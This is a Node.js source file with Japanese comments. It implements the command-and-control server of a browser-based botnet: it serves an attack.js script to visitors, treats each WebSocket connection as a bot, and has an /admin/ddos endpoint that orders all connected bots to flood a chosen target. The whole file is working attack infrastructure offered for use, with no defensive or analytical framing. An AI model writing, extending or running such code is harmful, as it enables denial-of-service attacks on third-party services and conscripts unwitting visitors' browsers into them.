const WebSocket = require('ws');
const http = require('http');
const fs = require('fs');

const server = http.createServer((req, res) => {
    if (req.url === '/' || req.url.startsWith('/?') || req.url === '/index.html') {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(fs.readFileSync('index.html'));
    } else if (req.url === '/attack.js') {
        res.writeHead(200, { 'Content-Type': 'application/javascript' });
        res.end(fs.readFileSync('attack.js'));
    } else if (req.url.startsWith('/admin/ddos?target=')) {
        const target = req.url.split('target=')[1].split('&')[0];
        startDDoS(target);
        res.end('DDoS開始: ' + target);
    } else if (req.url === '/admin/stats') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            bots: wss.clients.size,
            target: ddosTarget,
            attacking: isDDoSAttacking
        }, null, 2));
    } else {
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        res.end('OK');
    }
});

// ============================================
// DDoS司令塔
// ============================================
let ddosTarget = null;
let isDDoSAttacking = false;

function startDDoS(target) {
    ddosTarget = target;
    isDDoSAttacking = true;
    
    console.log(`[⚡] DDoS開始: ${target}`);
    console.log(`[📊] 参加ボット数: ${wss.clients.size}`);
    
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(JSON.stringify({
                command: 'ddos',
                target: target
            }));
        }
    });
}

const wss = new WebSocket.Server({ server, path: '/ws' });

wss.on('connection', (ws, req) => {
    const ip = req.connection.remoteAddress;
    console.log(`[+] 接続: ${ip} | 総ボット数: ${wss.clients.size}`);
    
    ws.send(JSON.stringify({
        command: 'attack'
    }));
    
    // すでにDDoS実行中なら参加させる
    if (isDDoSAttacking && ddosTarget) {
        ws.send(JSON.stringify({
            command: 'ddos',
            target: ddosTarget
        }));
    }
    
    ws.on('message', (data) => {
        try {
            const msg = JSON.parse(data);
            if (msg.type === 'ping') {
                ws.send(JSON.stringify({ type: 'pong' }));
            }
        } catch(e) {}
    });
    
    ws.on('close', () => {
        console.log(`[-] 切断: ${ip} | 総ボット数: ${wss.clients.size}`);
    });
    
    ws.on('error', () => {});
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`サーバー起動: ${PORT}`);
});
